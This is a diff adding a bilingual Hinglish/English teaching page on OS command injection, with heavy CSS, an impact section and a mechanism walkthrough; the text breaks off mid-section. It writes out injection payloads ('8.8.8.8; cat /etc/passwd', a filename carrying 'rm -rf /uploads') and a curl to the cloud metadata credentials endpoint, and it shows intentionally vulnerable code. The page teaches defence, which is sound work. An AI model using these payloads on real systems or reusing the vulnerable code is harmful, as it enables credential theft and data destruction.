+    font-family: 'Poppins', sans-serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    background-size: 200% auto;
+    animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+  }
+
+  @media (max-width:600px){
+    .level-header{padding:14px;gap:10px;}
+    .level-badge{width:30px;height:30px;font-size:13px;}
+    .hero{padding:30px 0 24px;}
+    main{padding:0 14px 20px;}
+    .controls-wrapper { flex-direction: column; align-items: flex-start; gap: 10px; }
+  }
+  @media (prefers-reduced-motion:reduce){
+    html{scroll-behavior:auto;}
+    *{transition-duration:0.01ms !important; animation: none !important;}
+  }
+  /* ---------- DYNAMIC CYBER BACKGROUND ---------- */
+  .cyber-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+
+  /* Matrix Dot Grid Overlay with continuous slow drift */
+  .cyber-grid {
+    position: absolute;
+    inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    -webkit-mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, rgba(0,0,0,1) 40%, rgba(0,0,0,0) 100%);
+    opacity: 0.85;
+    animation: gridDrift 60s linear infinite;
+  }
+  :root[data-theme="light"] .cyber-grid {
+    background-image: 
+      radial-gradient(rgba(15, 23, 42, 0.08) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    opacity: 0.6;
+  }
+
+  @keyframes gridDrift {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(96px, 96px); }
+  }
+
+  /* Ambient Glowing Floating Orbs */
+  .cyber-orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(100px);
+    opacity: 0.35;
+    will-change: transform;
+  }
+  :root[data-theme="light"] .cyber-orb {
+    opacity: 0.18;
+    filter: blur(110px);
+  }
+
+  .orb-1 {
+    width: 650px;
+    height: 650px;
+    background: radial-gradient(circle, #6366f1 0%, rgba(99,102,241,0) 70%);
+    top: -120px;
+    left: -100px;
+    animation: floatOrb1 16s ease-in-out infinite alternate;
+  }
+
+  .orb-2 {
+    width: 700px;
+    height: 700px;
+    background: radial-gradient(circle, #a855f7 0%, rgba(168,85,247,0) 70%);
+    top: 15%;
+    right: -150px;
+    animation: floatOrb2 20s ease-in-out infinite alternate;
+  }
+
+  .orb-3 {
+    width: 560px;
+    height: 560px;
+    background: radial-gradient(circle, #06b6d4 0%, rgba(6,182,212,0) 70%);
+    bottom: -80px;
+    left: 15%;
+    animation: floatOrb3 18s ease-in-out infinite alternate;
+  }
+
+  .orb-4 {
+    width: 500px;
+    height: 500px;
+    background: radial-gradient(circle, #f43f5e 0%, rgba(244,63,94,0) 70%);
+    bottom: 18%;
+    right: 12%;
+    animation: floatOrb4 22s ease-in-out infinite alternate;
+  }
+
+  /* Keyframe Animations for Smooth Floating */
+  @keyframes floatOrb1 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(120px, 90px) scale(1.15); }
+    100% { transform: translate(-60px, 140px) scale(0.92); }
+  }
+
+  @keyframes floatOrb2 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-140px, 110px) scale(1.18); }
+    100% { transform: translate(-80px, -70px) scale(0.9); }
+  }
+
+  @keyframes floatOrb3 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(90px, -100px) scale(1.14); }
+    100% { transform: translate(-100px, -50px) scale(1.05); }
+  }
+
+  @keyframes floatOrb4 {
+    0% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(-110px, -80px) scale(1.2); }
+    100% { transform: translate(90px, 70px) scale(0.9); }
+  }
+
+  /* Floating Cyber Data Particles */
+  .cyber-particle {
+    position: absolute;
+    border-radius: 50%;
+    background: #fff;
+    box-shadow: 0 0 8px currentColor;
+    opacity: 0;
+    animation: floatParticle 14s infinite ease-in-out;
+  }
+
+  .p-1 { width: 3px; height: 3px; left: 12%; bottom: -20px; color: var(--brand-1); animation-delay: 0s; animation-duration: 15s; }
+  .p-2 { width: 4px; height: 4px; left: 28%; bottom: -20px; color: var(--brand-2); animation-delay: 3s; animation-duration: 18s; }
+  .p-3 { width: 3px; height: 3px; left: 48%; bottom: -20px; color: var(--safe); animation-delay: 6s; animation-duration: 14s; }
+  .p-4 { width: 4px; height: 4px; left: 68%; bottom: -20px; color: var(--danger); animation-delay: 2s; animation-duration: 20s; }
+  .p-5 { width: 3px; height: 3px; left: 84%; bottom: -20px; color: var(--accent); animation-delay: 7s; animation-duration: 16s; }
+  .p-6 { width: 4px; height: 4px; left: 94%; bottom: -20px; color: #38bdf8; animation-delay: 4s; animation-duration: 19s; }
+  .p-7 { width: 3px; height: 3px; left: 38%; bottom: -20px; color: var(--safe); animation-delay: 9s; animation-duration: 17s; }
+  .p-8 { width: 4px; height: 4px; left: 58%; bottom: -20px; color: var(--brand-2); animation-delay: 11s; animation-duration: 21s; }
+
+  @keyframes floatParticle {
+    0% { transform: translateY(0) translateX(0) scale(0.5); opacity: 0; }
+    15% { opacity: 0.8; }
+    85% { opacity: 0.8; }
+    100% { transform: translateY(-105vh) translateX(50px) scale(1.2); opacity: 0; }
+  }
+
+  /* Scanline sweep effect */
+  .cyber-scanline {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(180deg, transparent 0%, rgba(99, 102, 241, 0.035) 50%, transparent 100%);
+    background-size: 100% 200%;
+    animation: scanSweep 12s linear infinite;
+  }
+
+  @keyframes scanSweep {
+    0% { background-position: 0% 0%; }
+    100% { background-position: 0% 200%; }
+  }
+
+
+  /* ── SUB-NAV BUTTONS ── */
+  .sub-nav-wrapper {
+    position: relative; background: transparent; border-bottom: none;
+    padding: 16px 20px 0; box-shadow: none;
+  }
+  .sub-nav-bar {
+    max-width: 840px; margin: 0 auto; display: flex; align-items: center;
+    justify-content: space-between; gap: 10px; overflow-x: auto;
+    scrollbar-width: none; -ms-overflow-style: none; padding: 2px 0;
+  }
+  .sub-nav-bar::-webkit-scrollbar { display: none; }
+  .sub-nav-btn {
+    flex: 1 1 0; display: inline-flex; align-items: center; justify-content: center;
+    gap: 8px; background: var(--panel); backdrop-filter: blur(16px);
+    border: 1px solid var(--border); color: var(--text-muted); padding: 9px 14px;
+    border-radius: 24px; text-decoration: none; font-family: var(--mono);
+    font-size: 12.5px; font-weight: 600; white-space: nowrap; transition: all 0.25s ease;
+  }
+  .sub-nav-btn:hover {
+    color: var(--text); border-color: var(--accent); background: var(--panel-2);
+    transform: translateY(-2px); box-shadow: 0 4px 12px rgba(255, 200, 87, 0.15);
+  }
+  .sub-nav-btn.active {
+    border-color: var(--accent);
+    background: var(--accent-bg);
+    color: var(--accent);
+    box-shadow: 0 4px 15px rgba(255, 200, 87, 0.25);
+  }
+  .sub-nav-btn.home-nav-btn { border-color: rgba(77, 158, 255, 0.4); color: var(--blue); }
+  .sub-nav-btn.home-nav-btn:hover { border-color: var(--blue); background: var(--blue-bg); color: #fff; }
+
+  /* ── BOTTOM NAVIGATION ROW (PREV & NEXT ONLY) ── */
+  .bottom-nav-row {
+    margin-top: 45px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 16px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+  }
+  .nav-arrow-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 10px 18px;
+    border-radius: 20px;
+    text-decoration: none;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 600;
+    transition: all 0.25s ease;
+    box-shadow: var(--shadow-sm);
+    white-space: nowrap;
+  }
+  .nav-arrow-btn:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: var(--accent-bg);
+    transform: translateY(-2px);
+  }
+  @media (max-width: 768px) {
+    .bottom-nav-row {
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      gap: 12px;
+    }
+    .bottom-nav-row .nav-arrow-btn {
+      justify-content: center;
+      width: 100%;
+      text-align: center;
+      white-space: normal;
+    }
+  }
+
+</style>
+</head>
+<body data-lang="hi">
+
+<!-- ================= DYNAMIC CYBER BACKGROUND ================= -->
+<div class="cyber-bg" aria-hidden="true">
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+  <div class="cyber-grid"></div>
+  <div class="cyber-scanline"></div>
+  <div class="cyber-particle p-1"></div>
+  <div class="cyber-particle p-2"></div>
+  <div class="cyber-particle p-3"></div>
+  <div class="cyber-particle p-4"></div>
+  <div class="cyber-particle p-5"></div>
+  <div class="cyber-particle p-6"></div>
+  <div class="cyber-particle p-7"></div>
+  <div class="cyber-particle p-8"></div>
+</div>
+
+<div class="topbar">
+  <a href="../index.html" class="brand" style="text-decoration:none; color:inherit;" title="Return to Main Hub">
+    <span class="brand-icon">🛡️</span>
+    <span class="brand-text"><code>CMDi :</code> OS Command Injection</span>
+  </a>
+  <div class="controls-wrapper">
+    <div class="lang-switch-wrapper">
+      <span id="lbl-hi" class="lang-active">Hindi</span>
+      <label class="switch">
+        <input type="checkbox" id="langToggle">
+        <span class="slider"></span>
+      </label>
+      <span id="lbl-en" class="lang-inactive">English</span>
+    </div>
+    <button class="theme-toggle" id="themeBtn">☀️ Light Mode</button>
+  </div>
+</div>
+
+<!-- ================= HORIZONTAL SUB-NAV BAR ================= -->
+<div class="sub-nav-wrapper">
+  <nav class="sub-nav-bar" aria-label="Section Navigation">
+    <a class="sub-nav-btn home-nav-btn" href="../index.html" title="Main Home Page">
+      <span class="sub-nav-icon">🏠</span>
+      <span class="lang-hi">Home</span><span class="lang-en">Home</span>
+    </a>
+    <a class="sub-nav-btn" href="#simulator">
+      <span class="sub-nav-icon">⚡</span>
+      <span class="lang-hi">Simulator</span><span class="lang-en">Simulator</span>
+    </a>
+    <a class="sub-nav-btn" href="#impact">
+      <span class="sub-nav-icon">💥</span>
+      <span class="lang-hi">Attack Vectors</span><span class="lang-en">Attack Vectors</span>
+    </a>
+    <a class="sub-nav-btn" href="#confusing-questions">
+      <span class="sub-nav-icon">🤔</span>
+      <span class="lang-hi">Questions</span><span class="lang-en">Questions</span>
+    </a>
+    <a class="sub-nav-btn" href="#tester-checklist">
+      <span class="sub-nav-icon">📝</span>
+      <span class="lang-hi">Checklist</span><span class="lang-en">Checklist</span>
+    </a>
+  </nav>
+</div>
+
+<main>
+
+  <section class="hero">
+    <p class="eyebrow"><span class="lang-hi">Web App Security — Technical Walkthrough</span><span class="lang-en">Web App Security — Technical Walkthrough</span></p>
+    <h1 class="title">
+        <span class="lang-hi">OS Command Injection: Ek Problem, Aur Use Fix Karne Ke Technical Solutions</span>
+        <span class="lang-en">OS Command Injection: One Problem, And Technical Solutions To Fix It</span>
+    </h1>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot"></span><span class="terminal-dot"></span><span class="terminal-dot"></span>
+        <span class="terminal-label"><span class="lang-hi">server.os_command_exec</span><span class="lang-en">server.os_command_exec</span></span>
+      </div>
+      <div class="terminal-body">
+        <span class="prompt">&gt;</span> <span id="typewriter"></span><span class="cursor"></span>
+      </div>
+    </div>
+
+    <div class="intro-block">
+      <p><strong><span class="lang-hi">OS Command Injection</span><span class="lang-en">OS Command Injection</span></strong> 
+        <span class="lang-hi">tab hoti hai jab ek application user input ko directly ek underlying operating system shell command mein pass kar deta hai, bina uski format ya content ko properly control kiye. Vulnerability tab banti hai jab developer sochta hai ki wo "sirf ek chhota sa system call" kar raha hai, lekin shell us input ke andar chhupe hue special characters ko commands ki tarah interpret kar leta hai.</span>
+        <span class="lang-en">occurs when an application passes user input directly into an underlying operating system shell command, without properly controlling its format or content. The vulnerability arises when a developer thinks they are making "just a small system call", but the shell interprets special characters hidden inside that input as separate commands.</span>
+      </p>
+      <p class="roadmap">
+        <span class="lang-hi">Mechanism → Misconfig 1 → Gap → Misconfig 2 → Gap → Misconfig 3 → Gap → Final Solution</span>
+        <span class="lang-en">Mechanism → Misconfig 1 → Gap → Misconfig 2 → Gap → Misconfig 3 → Gap → Final Solution</span>
+      </p>
+    </div>
+
+    <a class="hero-cta" href="#simulator">⚡ <span class="lang-hi">Har misconfiguration ko simulator mein khud test karo ↓</span><span class="lang-en">Test every misconfiguration yourself in the simulator ↓</span></a>
+  </section>
+
+  <!-- REAL-WORLD IMPACT -->
+  <section class="impact-section" id="impact">
+    <div class="sec-head" style="margin-top:0;">
+      <p class="sec-eyebrow"><span class="lang-hi">Isse kya farak padta hai?</span><span class="lang-en">Why does this actually matter?</span></p>
+      <h2>💥 <span class="lang-hi">Real-World Impact — Agar Ye Vulnerability Live Website Mein Ho To Kya Ho Sakta Hai</span><span class="lang-en">Real-World Impact — What Can Happen If A Live Website Has This Bug</span></h2>
+      <p>
+        <span class="lang-hi">Mechanism mein jaane se pehle ye samajhna zaroori hai: agar ek real website mein ye bug mil jaaye, to attacker ASAL MEIN kar kya sakta hai? Neeche wo concrete scenarios hain jo real incidents mein baar-baar dekhe gaye hain.</span>
+        <span class="lang-en">Before diving into the mechanism, it's important to understand: if this bug is found on a real website, what can the attacker ACTUALLY do? Below are concrete scenarios that have repeatedly been seen in real incidents.</span>
+      </p>
+    </div>
+
+    <div class="impact-card">
+      <h3>🖥️ <span class="lang-hi">1. Poore Server Par Full Control (RCE)</span><span class="lang-en">1. Full Control Over The Entire Server (RCE)</span></h3>
+      <p>
+        <span class="lang-hi">Ye sabse basic aur sabse bada impact hai — attacker sirf ek command tak limited nahi rehta. Ek baar shell mein ek command chal jaaye, wo agla command bhi chala sakta hai — jaise apna khud ka "webshell" (ek chhota malicious script) upload karna, jo use browser se hi baar-baar seedha server par commands chalane deta hai. Ye ek chhoti si "ping tool" wali vulnerability ko poore server ke owner banne mein badal deta hai.</span>
+        <span class="lang-en">This is the most basic and biggest impact — the attacker isn't limited to a single command. Once one command runs in the shell, they can run the next one too — like uploading their own "webshell" (a small malicious script) that lets them keep running commands directly on the server, from a browser, over and over. This turns a small "ping tool" bug into the attacker becoming the effective owner of the entire server.</span>
+      </p>
+    </div>
+
+    <div class="impact-card">
+      <h3>🗂️ <span class="lang-hi">2. Sensitive Data Chori (Data Breach)</span><span class="lang-en">2. Sensitive Data Theft (Data Breach)</span></h3>
+      <p>
+        <span class="lang-hi">Ek simple command jaise <code>cat config.php</code> ya <code>cat .env</code> se attacker ko seedha DATABASE PASSWORD, API keys, aur third-party service credentials mil jaate hain. In credentials ka use karke wo poore customer database ko dump kar sakta hai — jisme names, emails, phone numbers, payment details tak ho sakte hain. Ye ek chhota RCE bug seedha bade-scale data breach mein badal deta hai.</span>
+        <span class="lang-en">A simple command like <code>cat config.php</code> or <code>cat .env</code> directly hands the attacker the DATABASE PASSWORD, API keys, and third-party service credentials. Using these credentials, they can dump the entire customer database — which can include names, emails, phone numbers, and even payment details. A small RCE bug turns directly into a large-scale data breach.</span>
+      </p>
+    </div>
+
+    <div class="impact-card">
+      <h3>☁️ <span class="lang-hi">3. Cloud Account Poori Tarah Compromise (Metadata Theft)</span><span class="lang-en">3. Entire Cloud Account Compromised (Metadata Theft)</span></h3>
+      <p>
+        <span class="lang-hi">Agar wo server AWS/GCP/Azure jaisi cloud par host ho raha hai, attacker ek command chala sakta hai jo server ke internal "metadata" endpoint ko query kare — jaise <code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. Ye endpoint sirf server ke andar se hi accessible hota hai (internet se nahi), isliye normally safe maana jaata hai — lekin command injection ke through attacker isi server ki taraf se ye request bhej sakta hai aur temporary CLOUD CREDENTIALS chura sakta hai, jinse wo poore cloud account ke andar aur bhi resources (databases, storage buckets, doosre servers) access kar sakta hai.</span>
+        <span class="lang-en">If the server is hosted on AWS/GCP/Azure, the attacker can run a command that queries the server's internal "metadata" endpoint — like <code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. This endpoint is normally only reachable from inside the server (not from the internet), so it's usually considered safe — but via command injection, the attacker can send this request AS the server itself and steal temporary CLOUD CREDENTIALS, which let them access even more resources inside the cloud account (databases, storage buckets, other servers).</span>
+      </p>
+    </div>
+
+    <div class="impact-card">
+      <h3>🔒 <span class="lang-hi">4. Ransomware Aur Destructive Attacks</span><span class="lang-en">4. Ransomware And Destructive Attacks</span></h3>
+      <p>
+        <span class="lang-hi">Attacker sirf data padhta nahi — wo delete ya encrypt bhi kar sakta hai. RCE mil jaane ke baad attacker files, databases, ya backups ko encrypt karne wala ransomware script chala sakta hai aur decryption ke badle payment maang sakta hai, ya bas jaanbujh kar data destroy kar sakta hai (jaise ek competitor ya disgruntled attacker karta hai).</span>
+        <span class="lang-en">The attacker doesn't just read data — they can delete or encrypt it too. Once they have RCE, the attacker can run a ransomware script that encrypts files, databases, or backups, and demand payment for decryption — or simply destroy data deliberately (as a competitor or disgruntled attacker might).</span>
+      </p>
+      <div class="csp-deep-dive">
+        <a href="../labs/cmdi_ransomware_destruction.html" target="_blank">
+          <span class="lang-hi">Click here to see the simulation of this attack 💻</span>
+          <span class="lang-en">Click here to see the simulation of this attack 💻</span>
+        </a>
+      </div>
+    </div>
+
+    <div class="impact-card">
+      <h3>🤖 <span class="lang-hi">5. Server Ko Botnet/Cryptominer Bana Dena</span><span class="lang-en">5. Turning The Server Into A Botnet/Cryptominer Node</span></h3>
+      <p>
+        <span class="lang-hi">Attacker ke liye har server "profitable" hota hai chahe usmein koi valuable data na ho. Wo ek chhota sa command chala kar cryptocurrency-mining malware download aur run karwa sakta hai (server ka CPU/GPU use karke uske liye paisa kamana), ya server ko apne DDoS botnet ka hissa bana sakta hai jo aage aur websites par attack karega. Victim company ko bijli/cloud bill badh jaata hai, performance degrade hoti hai, aur unka IP address blacklist ho sakta hai kisi aur ke against attack mein use hone ki wajah se.</span>
+        <span class="lang-en">Every server is "profitable" for an attacker even if it has no valuable data. They can run a small command to download and run cryptocurrency-mining malware (using the server's CPU/GPU to earn money), or add the server to their DDoS botnet that attacks other websites. The victim company sees increased power/cloud bills, degraded performance, and their IP address can get blacklisted for being used in attacks against someone else.</span>
+      </p>
+      <div class="csp-deep-dive">
+        <a href="../labs/cmdi_cryptominer_botnet.html" target="_blank">
+          <span class="lang-hi">Click here to see the simulation of this attack 💻</span>
+          <span class="lang-en">Click here to see the simulation of this attack 💻</span>
+        </a>
+      </div>
+    </div>
+
+    <div class="impact-card">
+      <h3>📜 <span class="lang-hi">6. Real-World Example — Shellshock (2014)</span><span class="lang-en">6. Real-World Example — Shellshock (2014)</span></h3>
+      <p>
+        <span class="lang-hi"><code>Shellshock (CVE-2014-6271)</code> ek famous, well-documented historical bug tha jisme khud Bash shell mein ek flaw tha — is wajah se attacker environment variables ke through arbitrary commands inject kar sakte the. Jo bhi web server CGI scripts, DHCP clients, ya kisi bhi jagah user input ko environment variables ke through bash tak pahunchate the, wo sab affected the. Internet-wide emergency patching hui thi kyunki attackers mass-scale par is bug ka use karke servers ko compromise kar rahe the — ye dikhata hai ki command injection sirf "theoretical" nahi, real-world mein critical, widespread impact rakhta hai.</span>
+        <span class="lang-en"><code>Shellshock (CVE-2014-6271)</code> was a famous, well-documented historical bug where a flaw existed in the Bash shell itself — allowing attackers to inject arbitrary commands via environment variables. Any web server that passed user input into bash via environment variables — through CGI scripts, DHCP clients, or anywhere else — was affected. Internet-wide emergency patching followed because attackers were using this bug at mass scale to compromise servers — it shows command injection isn't just "theoretical", it has had critical, widespread real-world impact.</span>
+      </p>
+    </div>
+
+  </section>
+
+  <section class="levels">
+
+    <!-- LEVEL 0 -->
+    <div class="level-card" id="level-0" data-level="0">
+      <button class="level-header">
+        <span class="level-badge">0</span>
+        <span class="level-titles">
+          <h2>
+            <span class="lang-hi">Mechanism — Shell, Aur Apps Isse Call Kyu Karte Hain</span>
+            <span class="lang-en">Mechanism — The Shell, And Why Apps Call It</span>
+          </h2>
+          <p>
+            <span class="lang-hi">Shell metacharacters ka exact kaam</span>
+            <span class="lang-en">The exact role of shell metacharacters</span>
+          </p>
+        </span>
+        <span class="level-tag problem"><span class="lang-hi">FOUNDATION</span><span class="lang-en">FOUNDATION</span></span>
+        <span class="chevron">▾</span>
+      </button>
+      <div class="level-body">
+        <div class="level-inner">
+          <h4>
+            <span class="lang-hi">APPS OS COMMANDS KYU CALL KARTE HAIN</span>
+            <span class="lang-en">WHY APPS CALL OS COMMANDS</span>
+          </h4>
+          <p>
+            <span class="lang-hi">Bahut saari legitimate features underlying OS tools use karti hain kyunki wo tools already-battle-tested aur efficient hote hain — jaise ek network diagnostic tool <code>ping</code> ya <code>traceroute</code> call kare, ek file-conversion feature <code>ffmpeg</code> ya <code>ImageMagick</code> ko call kare, ya ek backup feature <code>tar</code>/<code>zip</code> binary ko call kare. Developer <code>system()</code>, <code>exec()</code>, <code>popen()</code>, ya Python ke <code>subprocess</code> jaise functions use karke apni application code se seedha OS shell ko command bhej deta hai.</span>
+            <span class="lang-en">Many legitimate features rely on underlying OS tools because they are already battle-tested and efficient — such as a network diagnostic feature calling <code>ping</code> or <code>traceroute</code>, a file-conversion feature calling <code>ffmpeg</code> or <code>ImageMagick</code>, or a backup feature calling the <code>tar</code>/<code>zip</code> binary. The developer uses functions like <code>system()</code>, <code>exec()</code>, <code>popen()</code>, or Python's <code>subprocess</code> to send a command straight from application code to the OS shell.</span>
+          </p>
+
+          <h4>
+            <span class="lang-hi">SHELL COMMAND KO KAISE PARSE KARTA HAI</span>
+            <span class="lang-en">HOW THE SHELL PARSES A COMMAND</span>
+          </h4>
+          <p>
+            <span class="lang-hi">Jab shell (bash/sh) ko ek string milti hai, wo use character-by-character parse karta hai aur kuch specific characters ko "control characters" (ya <code>metacharacters</code>) ki tarah treat karta hai — inka matlab hota hai "yahan pe ek command khatam hui, agli command shuru ho rahi hai":</span>
+            <span class="lang-en">When the shell (bash/sh) receives a string, it parses it character-by-character and treats certain specific characters as "control characters" (or <code>metacharacters</code>) — meaning "one command ends here, the next command starts":</span>
+          </p>
+          <pre><code>;    → sequential execution   (cmd1 ; cmd2)
+&&   → run cmd2 only if cmd1 succeeds
+||   → run cmd2 only if cmd1 fails
+|    → pipe output of cmd1 into cmd2
+&    → run cmd1 in background
+`cmd`, $(cmd) → command substitution (runs cmd, inserts output)
+\n   → newline also separates commands</code></pre>
+          <p>
+            <span class="lang-hi">Ye metacharacters bahut useful hain jab ek developer khud terminal mein type karta hai. Lekin agar ek application in hi metacharacters wale RAW user input ko bina check kiye seedha shell string mein daal deta hai, to attacker in metacharacters ka use karke apni MARZI ka koi bhi extra command inject kar sakta hai.</span>
+            <span class="lang-en">These metacharacters are very useful when a developer types them into a terminal themselves. But if an application inserts RAW user input containing these same metacharacters straight into a shell string without checking it, an attacker can use these metacharacters to inject ANY extra command of their choosing.</span>
+          </p>
+
+          <div class="callout analogy">
+            <span class="cal-label">
+                <span class="lang-hi">💡 REAL-LIFE ANALOGY (BEGINNER FRIENDLY)</span>
+                <span class="lang-en">💡 REAL-LIFE ANALOGY (BEGINNER FRIENDLY)</span>
+            </span>
+            <p>
+                <span class="lang-hi">Ek chhota real bash script socho jo koi bhi developer likh sakta hai — ek uploaded file ka naam leke usse rename karta hai:</span>
+                <span class="lang-en">Consider a small real bash script that any developer could write — it takes an uploaded file's name and renames it:</span>
+            </p>
+            <pre style="margin:12px 0;"><code>#!/bin/bash
+mv $1 /uploads/final_$1</code></pre>
+            <p>
+                <span class="lang-hi">Terminal mein <code>./rename.sh report.txt</code> chalane par shell exactly ye command samajhta hai: <code>mv report.txt /uploads/final_report.txt</code> — bilkul normal. Lekin agar <code>$1</code> (yaani filename) attacker ke control mein hai aur wo terminal mein ye value pass karta hai: <code>report.txt; rm -rf /uploads</code>, to shell isse EK STRING mein expand karke padhta hai: <code>mv report.txt; rm -rf /uploads /uploads/final_report.txt; rm -rf /uploads</code>. Shell ko <code>;</code> dikhte hi turant samajh aata hai "pehla command khatam, ab agla command shuru" — isliye <code>mv</code> ke turant baad <code>rm -rf /uploads</code> bhi ek independent, valid command ki tarah chal jaata hai, poore uploads folder ko delete karke.</span>
+                <span class="lang-en">Running <code>./rename.sh report.txt</code> in a terminal makes the shell understand exactly this command: <code>mv report.txt /uploads/final_report.txt</code> — perfectly normal. But if <code>$1</code> (the filename) is under attacker control and they pass this value: <code>report.txt; rm -rf /uploads</code>, the shell expands it into ONE STRING and reads: <code>mv report.txt; rm -rf /uploads /uploads/final_report.txt; rm -rf /uploads</code>. The moment the shell sees the <code>;</code>, it understands "first command ends here, next command starts" — so right after <code>mv</code>, <code>rm -rf /uploads</code> also runs as an independent, valid command, deleting the entire uploads folder.</span>
+            </p>
+            <p>
+                <span class="lang-hi">Yahi exact mechanism web application mein bhi hota hai — bas <code>$1</code> ki jagah ek HTTP request se aaya hua form field/parameter hota hai. Shell ko koi farq nahi padta value terminal se aayi ya web request se — usse sirf metacharacters (<code>;</code>, <code>&</code>, <code>|</code>) hi command boundaries decide karte hain.</span>
+                <span class="lang-en">This exact mechanism happens in a web application too — except instead of <code>$1</code>, the value comes from a form field/parameter in an HTTP request. The shell doesn't care whether the value came from a terminal or a web request — it only uses metacharacters (<code>;</code>, <code>&</code>, <code>|</code>) to decide command boundaries.</span>
+            </p>
+          </div>
+
+          <div class="callout">
+            <span class="cal-label">
+                <span class="lang-hi">⚠️ PROBLEM KI JADD</span>
+                <span class="lang-en">⚠️ THE ROOT OF THE PROBLEM</span>
+            </span>
+            <p>
+                <span class="lang-hi">Shell input ko EK SINGLE STRING ki tarah parse karta hai — usko koi idea nahi hota ki "kaunsa part developer ne likha tha" aur "kaunsa part user ne diya tha". String ke andar likhe hue metacharacters ki hi wajah se shell decide karta hai kahan command khatam hui — isi trust boundary ki galti se command injection possible hoti hai.</span>
+                <span class="lang-en">The shell parses input as ONE SINGLE STRING — it has no concept of "which part the developer wrote" versus "which part the user supplied". The shell decides where a command ends purely based on metacharacters present in the string — it is exactly this broken trust boundary that makes command injection possible.</span>
+            </p>
+          </div>
+
+          <a class="sim-jump" href="#simulator">🎮 <span class="lang-hi">Baseline behavior simulator mein dekho</span><span class="lang-en">See baseline behavior in the simulator</span></a>
+        </div>
+      </div>
+    </div>
+
+    <!-- LEVEL 1 -->
+    <div class="level-card" id="level-1" data-level="1">
+      <button class="level-header">
+        <span class="level-badge">1</span>
+        <span class="level-titles">
+          <h2>
+            <span class="lang-hi">Misconfiguration 1 — Naive String Concatenation</span>
+            <span class="lang-en">Misconfiguration 1 — Naive String Concatenation</span>
+          </h2>
+          <p>
+            <span class="lang-hi">Classic injection, direct shell metacharacters se</span>
+            <span class="lang-en">Classic injection, via direct shell metacharacters</span>
+          </p>
+        </span>
+        <span class="level-tag problem"><span class="lang-hi">GAP</span><span class="lang-en">GAP</span></span>
+        <span class="chevron">▾</span>
+      </button>
+      <div class="level-body">
+        <div class="level-inner">
+          <h4>
+            <span class="lang-hi">CLASSIC CONCATENATION KI GALTI</span>
+            <span class="lang-en">THE CLASSIC CONCATENATION FLAW</span>
+          </h4>
+          <p>
+            <span class="lang-hi">Ek "ping this IP" feature socho. Developer directly user ke diye hue IP ko command string mein concatenate kar deta hai:</span>
+            <span class="lang-en">Imagine a "ping this IP" feature. The developer directly concatenates the user-supplied IP into the command string:</span>
+          </p>
+          <pre><code>os.system("ping -c 4 " + user_input)</code></pre>
+          <p>
+            <span class="lang-hi">Normal use case mein user <code>8.8.8.8</code> jaisa IP daalega aur command ban jaayegi <code>ping -c 4 8.8.8.8</code> — bilkul theek chalta hai.</span>
+            <span class="lang-en">In the normal use case the user enters an IP like <code>8.8.8.8</code> and the command becomes <code>ping -c 4 8.8.8.8</code> — it runs perfectly fine.</span>
+          </p>
+
+          <div class="callout">
+            <span class="cal-label">
+                <span class="lang-hi">⚠️ GAP</span>
+                <span class="lang-en">⚠️ GAP</span>
+            </span>
+            <p>
+                <span class="lang-hi">Attacker input field mein sirf ek IP nahi, ek metacharacter-laden payload bhejta hai:</span>
+                <span class="lang-en">The attacker doesn't send just an IP in the input field — they send a metacharacter-laden payload:</span>
+            </p>
+            <pre><code>8.8.8.8; cat /etc/passwd</code></pre>
+            <p>
+                <span class="lang-hi">Final command ban jaati hai <code>ping -c 4 8.8.8.8; cat /etc/passwd</code>. Shell isko DO SEPARATE commands ki tarah parse karta hai — pehle <code>ping</code> chalta hai, phir <code>;</code> ke baad <code>cat /etc/passwd</code> BHI chal jaata hai, apne aap, koi extra permission maange bina.</span>
+                <span class="lang-en">The final command becomes <code>ping -c 4 8.8.8.8; cat /etc/passwd</code>. The shell parses this as TWO SEPARATE commands — first <code>ping</code> runs, then after the <code>;</code>, <code>cat /etc/passwd</code> ALSO runs, automatically, without asking for any extra permission.</span>
+            </p>
+          </div>
+
+          <div class="callout analogy">
+            <span class="cal-label">
+                <span class="lang-hi">💡 SIMPLE WORDS MEIN</span>
+                <span class="lang-en">💡 IN SIMPLE WORDS</span>
+            </span>
+            <p>
